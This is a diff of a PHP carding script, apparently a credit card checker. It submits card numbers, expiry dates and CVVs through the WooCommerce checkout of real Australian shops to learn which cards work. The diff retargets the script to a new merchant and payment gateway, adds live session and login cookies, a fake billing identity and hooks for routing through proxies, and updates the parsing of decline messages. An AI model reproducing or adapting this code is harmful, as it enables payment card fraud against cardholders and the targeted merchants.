@@ -46,10 +46,10 @@ if($cbin == "3"){
    $cardnum = "$cc1 $cc2 $cc3 $cc4";
 }
 
-// If(strlen($ano) > 2)
-// {
-//   $ano = substr($ano,2,2);
-// }
+If(strlen($ano) > 2)
+{
+  $ano = substr($ano,2,2);
+}
  function value($str,$find_start,$find_end){
 $start = @strpos($str,$find_start);
 if ($start === false) {
@@ -205,7 +205,7 @@ curl_close($ch);
 // // //////////////////////// START REQUEST 2 ////////////////////////
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://ginginanddry.net.au/?wc-ajax=checkout');
+curl_setopt($ch, CURLOPT_URL, 'https://mgaonline.com.au/checkout/?wc-ajax=checkout');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -238,15 +238,16 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept-encoding: gzip, deflate',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: wpfront-notification-bar-landingpage=1; wp_woocommerce_session_8e83faf0a70e323ccef66f6553c0c86a=c1487aa6aff94ee52205600e77733658%7C%7C1594203829%7C%7C1594200229%7C%7C8bb4b29f44723f4ac5cd7fd0e66aa134; mailchimp.cart.current_email=pubgkittu@gmail.com; mailchimp_user_email=pubgkittu%40gmail.com; mailchimp.cart.previous_email=pubgkittu@gmail.com; mailchimp_landing_site=https%3A%2F%2Fginginanddry.net.au%2Fwp-admin%2Fadmin-ajax.php%3Faction%3Dmailchimp_set_user_by_email%26email%3Dpubgkittu%40gmail.com%26language%3Den; woocommerce_items_in_cart=1; woocommerce_cart_hash=c46d223adeb3bf2a66092f70ab9784b3',
-'origin: https://ginginanddry.net.au',
-'referer: https://ginginanddry.net.au/checkout-2/',
+'Cookie: PHPSESSID=vokdi8jjh864h0170iqmagu5b4; woocommerce_items_in_cart=1; woocommerce_cart_hash=f85fba87120d08673980326b98df1ca9; wp_woocommerce_session_4a63af4a0334e6a2e6aabdbcd2bf2648=fe9d5944e398d7895f3cf6a23918a767%7C%7C1594355868%7C%7C1594352268%7C%7C20715e22979a3ff3c400ffbae648c3f0; wordpress_logged_in_4a63af4a0334e6a2e6aabdbcd2bf2648=pubgkittu%7C1595392720%7CI8pGWxfJUaHLz4jW0QEHidGiFmcaDMuZr6ycu3dq1eG%7C7b3228e56f5acb1cbb4ff47d8e354bb239d66ee6ae6928226631ba01e921e403; wfwaf-authcookie-a91661de683a206a94e0a45e0a7bcb6e=8684%7C%7Ce8ff88205f57ec4992e2dc62e8c33afdc987c72d7a67947423eb08d958daccbf',
+'Host: mgaonline.com.au',
+'Origin: https://mgaonline.com.au',
+'Referer: https://mgaonline.com.au/checkout/',
 'user-agent: '.$browser.''
 ));
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincent&billing_last_name=Warner&billing_company=&billing_country=AU&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=NSW&billing_postcode=2150&billing_phone=%2B615182641524&billing_email=pubgkittu%40gmail.com&mailchimp_woocommerce_newsletter=1&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=QLD&shipping_postcode=&order_comments=&shipping_method%5B0%5D=betrs_shipping%3A2-1&payment_method=migs&migs_card_number='.$cc.'&migs_card_expiration_month='.$mes.'&migs_card_expiration_year='.$ano.'&migs_card_csc='.$cvv.'&woocommerce-process-checkout-nonce=febcd2870a&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincent&billing_last_name=Warner&billing_company=&billing_email=pubgkittu%40gmail.com&billing_phone=%2B615182641524&billing_country=AU&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=NSW&billing_postcode=2150&coupon_code=&payment_method=eway_payments&eway_payments-card-name=Vincent+Warner&eway_payments-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&eway_payments-card-expiry='.$mes.'+%2F+'.$ano.'&eway_payments-card-cvc='.$cvv.'&_wpnonce=57f0adb712&_wp_http_referer=%2Fcheckout%2F%3Fwc-ajax%3Dupdate_order_review');
 
 // // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
@@ -256,7 +257,7 @@ if (curl_errno($ch)) {
     echo 'Error:'.curl_error($ch);
 }
 curl_close($ch);
-$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tPayment error: ','\t\t<\/li>\n\t<\/ul>\n"')));
+$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\">\n\t\t\t<li>Transaction failed<br \/>','<\/li>\n\t<\/ul>\n"')));
 // $code = trim(strip_tags(getstr($result,'"errorCode":"','"')));
 // // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
 
